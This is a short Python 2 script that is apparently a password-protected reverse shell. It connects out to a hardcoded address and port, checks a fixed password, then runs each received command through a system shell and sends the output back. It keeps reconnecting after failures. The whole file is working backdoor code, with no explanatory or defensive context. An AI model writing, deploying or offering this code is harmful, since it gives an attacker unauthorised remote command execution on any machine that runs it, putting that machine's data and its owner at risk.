import subprocess, socket

HOST = '192.168.1.107'
PORT = 2222
PASSWORD = "kahn_online"

def login():
    global socketOB
    socketOB.send("Login: ")
    pwd = socketOB.recv(2048)



    if pwd.strip() != PASSWORD:
        socketOB.send("Error")
        login()
    else:
        socketOB.send("Hi Kahn Ji :) \n")
        shell()

def shell():
    global socketOB
    while 1:
        try:
            data = socketOB.recv(512)
        except Exception as err:
            print err
        if data.strip() == "bye":
            break
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            stdoutput = proc.stdout.read() + proc.stderr.read()
            socketOB.send(stdoutput)

    socketOB.send("GoodBye Kahn Ji \n")
    socketOB.close()
    start()

def start():
    global socketOB
    try:
        socketOB = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketOB.connect((HOST, PORT))
        login()
    except Exception as e:
        start()


start()